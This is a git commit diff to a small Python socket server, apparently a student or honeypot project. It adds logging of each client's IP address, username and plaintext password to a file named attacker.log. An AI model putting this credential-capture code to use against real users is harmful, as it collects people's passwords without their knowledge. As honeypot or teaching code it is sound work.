d27a131f3b41480b1a90ed8ee9cc22f426ee82e0
bleblablue <son14102007@gmail.com>
2026-05-18 21:56:20 +0700

    them attacker.log de ghi log IP,username,pw

--- Server.py
+++ Server.py
@@ -1,4 +1,5 @@
 import socket
+from datetime import datetime
 #1. socket
 server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 #2. lang nghe tai ip va port
@@ -17,6 +18,11 @@ while True:
         #nhan pw
     password=client_socket.recv(1024).decode()
     #print log
-    print(username)
-    print(password)
+    print(f"USERNAME: {username}")
+    print(f"PASSWORD: {password}")
+    with open("attacker.log","a") as f:
+        f.write(f"IP: {address}\n")
+        f.write(f"USERNAME: {username}\n")
+        f.write(f"PASSWORD: {password}\n")
+        f.write("--------------------------------------\n")
     client_socket.close()
